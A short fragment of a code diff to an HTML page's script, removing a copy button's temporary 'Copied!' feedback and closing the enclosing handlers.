-    const original = btn.innerHTML;
-    btn.innerHTML = "<span class=\"btn-icon\">✓</span> Copied!";
-    btn.classList.add("copied");
-    setTimeout(() => { btn.innerHTML = original; btn.classList.remove("copied"); }, 1500);
-  }
+  });
+});
 </script>
 </body>
 </html>
